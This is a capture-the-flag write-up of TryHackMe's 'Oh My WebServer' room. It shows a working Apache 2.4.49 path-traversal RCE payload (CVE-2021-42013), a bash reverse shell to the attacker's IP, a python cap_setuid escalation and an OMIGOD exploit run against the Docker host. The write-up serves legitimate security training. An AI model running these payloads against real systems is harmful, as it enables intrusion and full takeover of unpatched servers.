---
title : "Oh My WebServer - Write Up"
date : 2022-03-05T09:34:39+02:00
author : "Lanfran02"
cover : "cover.jpeg"
useRelativeCover : true
description : "TryHackMe's medium level machine."
tags : ["CVE-2021-42013","RCE","Apache","Docker","OMIGOD","TryHackMe"]
---

| Link | Level | Creator |
|------|-------|---------|
| [Here](https://tryhackme.com/room/ohmyweb) | Medium | [tinyb0y](https://tryhackme.com/p/tinyb0y)  |

## Reconn
Hey! Welcome back!

Once again we are running `nmap` against this machine, to see what services are running!

```bash
└──╼ $sudo nmap -sS -sV -sC --min-rate 5000 10.10.239.45 -Pn -n
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-05 15:13 CET
Nmap scan report for 10.10.239.45
Host is up (0.13s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e0:d1:88:76:2a:93:79:d3:91:04:6d:25:16:0e:56:d4 (RSA)
|   256 91:18:5c:2c:5e:f8:99:3c:9a:1f:04:24:30:0e:aa:9b (ECDSA)
|_  256 d1:63:2a:36:dd:94:cf:3c:57:3e:8a:e8:85:00:ca:f6 (ED25519)
80/tcp open  http    Apache httpd 2.4.49 ((Unix))
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.49 (Unix)
|_http-title: Consult - Business Consultancy Agency Template | Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
A normal machine, with just 2 common ports open... 

But one thing that called our attention:
The web server (Port 80) is running on `apache/2.4.49`
For that version we have a CVE-2021-42013! You can find more information about it [here](https://blog.qualys.com/vulnerabilities-threat-research/2021/10/27/apache-http-server-path-traversal-remote-code-execution-cve-2021-41773-cve-2021-42013).

Just to confirm the version we did a simple `curl` request to the machine, to check the `Server` header.
```bash
└──╼ $curl -v http://10.10.239.45 | head
*   Trying 10.10.239.45:80...
 GET / HTTP/1.1
 Host: 10.10.239.45
 User-Agent: curl/7.74.0
 Accept: */* 

* Mark bundle as not supporting multiuse
HTTP/1.1 200 OK
Date: Sat, 05 Mar 2022 14:16:00 GMT
Server: Apache/2.4.49 (Unix)
Last-Modified: Wed, 23 Feb 2022 05:40:45 GMT
ETag: "e281-5d8a8e82e3140"
Accept-Ranges: bytes
Content-Length: 57985
Content-Type: text/html
```
And to check for the possible exploit, we checked the `cgi-bin` folder.

```bash
└──╼ $curl http://10.10.239.45/cgi-bin/
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
</body></html>
```
And it's active! 
So we can run the exploit and try luck!

```bash
└──╼ $curl 'http://10.10.239.45/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; whoami && pwd && id' -H "Content-Type: text/plain"
daemon
/bin
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```
Yay! We have `RCE`!

## Foothold - User

To get a `reverse shell` we used 2 terminals. The first one is making a request with the exploit, and the second one is just waiting the connection.
```bash
=====Terminal 1======

└──╼ $curl 'http://10.10.239.45/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/10.9.1.30/1337 0>&1' -H "Content-Type: text/plain"


=====Terminal 2======

└──╼ $nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.9.1.30] from (UNKNOWN) [10.10.239.45] 40344
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
daemon@4a70924bafa0:/bin$ id;whoami;pwd
id;whoami;pwd
uid=1(daemon) gid=1(daemon) groups=1(daemon)
daemon
/bin
daemon@4a70924bafa0:/bin$

```

And we are in! But we are running as a `daemon`, so we can't get the `user flag` :/

Enumerating the machine, we found out that the binary `python3.7` has the `cap_setuid` capability set! (You can learn more about how to exploit this with [GTFOBIN](https://gtfobins.github.io/gtfobins/python/#capabilities))

```bash
daemon@4a70924bafa0:/bin$ getcap -r / 2>/dev/null
/usr/bin/python3.7 = cap_setuid+ep

daemon@4a70924bafa0:/bin$ python3.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# id
uid=0(root) gid=1(daemon) groups=1(daemon)
# cat /root/user.txt
THM{[REDACTED]}
```
Yes! We now are root inside a `docker` container and we can submit the user flag!

## Root

After enumerating _quite a lot_ the machine, we just guessed that there's maybe another machine (In this case the dockers's host) in the adyacent IP. So basically, that the host is on `172.17.0.1`, since we are the `172.17.0.2`

```bash
root@4a70924bafa0:/tmp# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
        RX packets 3122  bytes 383708 (374.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2172  bytes 2759329 (2.6 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 2  bytes 100 (100.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2  bytes 100 (100.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
To confirm this assumption, we uploaded an static binary of `nmap` from out machine. You can download it from [here](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap).
And we ran it against the supposed Host's IP.
```bash
root@4a70924bafa0:/tmp# ./nmap 172.17.0.1 -p- --min-rate 5000

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-03-05 14:48 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-172-17-0-1.eu-west-1.compute.internal (172.17.0.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (-0.0014s latency).
Not shown: 65531 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
5985/tcp closed unknown
5986/tcp open   unknown
MAC Address: 02:42:1A:89:70:8B (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 39.82 seconds
```
Yes! We were right!
And we have some open ports!

Searching on google for `port 5986 service exploit`, we found this POC:

https://github.com/AlteredSecurity/CVE-2021-38647

This exploit is against the `OHMIGOD` service, commonly runnnig on ports as `5986`.

Downloaded the exploit to the victim machine and tried to exploit it!

```bash
root@4a70924bafa0:/tmp# python3 exp.py -t 172.17.0.1 -c 'whoami;pwd;id;hostname;uname -a;cat /root/root.txt;'
root
/var/opt/microsoft/scx/tmp
uid=0(root) gid=0(root) groups=0(root)
ubuntu
Linux ubuntu 5.4.0-88-generic #99-Ubuntu SMP Thu Sep 23 17:29:00 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
THM{[REDACTED]}
```
And we rooted the machine!

That's all from my side, hope you find this helpful!